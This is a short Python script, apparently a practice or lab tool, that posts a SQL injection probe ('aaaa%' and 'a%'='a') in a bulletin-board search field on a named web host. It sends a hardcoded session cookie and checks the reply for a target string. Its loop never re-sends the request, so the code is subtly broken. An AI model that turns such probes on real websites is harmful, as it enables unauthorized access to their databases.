import requests
import random
import time

### VAL AREA
targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
targetString = "카카오"

headers = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
data = {
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": "aaaa%' and 'a%'='a",
}


### FUNCTION AREA
r = requests.post(targetURL, headers=headers, cookies=cookies, data=data)

while True:
    if targetString in r.text:
        print("success!")

    time.sleep(random.randrange(10, 21))
